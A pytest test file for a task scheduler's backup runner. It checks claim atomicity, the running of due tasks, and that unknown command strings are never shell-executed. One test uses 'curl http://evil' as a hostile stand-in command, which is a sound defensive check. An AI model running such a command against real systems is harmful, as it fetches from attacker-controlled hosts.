from __future__ import annotations

import time
from types import SimpleNamespace

import pytest
import pytest_asyncio

from tinyagentos.scheduler import TaskScheduler
from tinyagentos.scheduler.task_runner import run_due_once


@pytest_asyncio.fixture
async def scheduler(tmp_path):
    s = TaskScheduler(tmp_path / "scheduler.db")
    await s.init()
    yield s
    await s.close()


@pytest.fixture
def app_state(scheduler, tmp_path):
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    (data_dir / "dummy.txt").write_text("hello")
    return SimpleNamespace(scheduler=scheduler, data_dir=data_dir)


@pytest.mark.asyncio
class TestClaimRunAtomicity:
    async def test_only_one_claim_wins(self, scheduler):
        task_id = await scheduler.add_task("auto-backup", "* * * * *", "create_backup")
        results = [
            await scheduler.claim_run(task_id, None, 1000, 2000),
            await scheduler.claim_run(task_id, None, 1000, 2000),
        ]
        assert results.count(True) == 1
        assert results.count(False) == 1


@pytest.mark.asyncio
class TestRunDueOnce:
    async def test_due_backup_runs_and_advances_last_run(self, scheduler, app_state):
        task_id = await scheduler.add_task("auto-backup", "* * * * *", "create_backup")
        await scheduler._db.execute(
            "UPDATE scheduled_tasks SET last_run = 0 WHERE id = ?", (task_id,)
        )
        await scheduler._db.commit()

        now = time.time() + 10 * 365 * 24 * 3600  # far future: always past-due
        dispatched = await run_due_once(app_state, now)

        assert dispatched == 1
        backups_root = app_state.data_dir / "data-backups"
        auto_backups = list(backups_root.glob("auto-*"))
        assert len(auto_backups) == 1
        assert (auto_backups[0] / "dummy.txt").exists()

        task = await scheduler.get_task(task_id)
        assert task["last_run"] == int(now)

    async def test_not_due_task_does_not_run(self, scheduler, app_state):
        await scheduler.add_task("yearly", "0 0 1 1 *", "create_backup")

        now = time.time()
        dispatched = await run_due_once(app_state, now)

        assert dispatched == 0
        backups_root = app_state.data_dir / "data-backups"
        assert not backups_root.exists()

    async def test_unknown_command_is_never_executed(self, scheduler, app_state):
        """SECURITY: an arbitrary command string (e.g. a preset like
        `curl http://evil`) must never be shell-executed. run_due_once must
        not raise and must dispatch nothing for it."""
        await scheduler.add_task("suspicious", "* * * * *", "curl http://evil")

        now = time.time() + 10 * 365 * 24 * 3600  # far future: always past-due
        dispatched = await run_due_once(app_state, now)

        assert dispatched == 0
        backups_root = app_state.data_dir / "data-backups"
        assert not backups_root.exists()
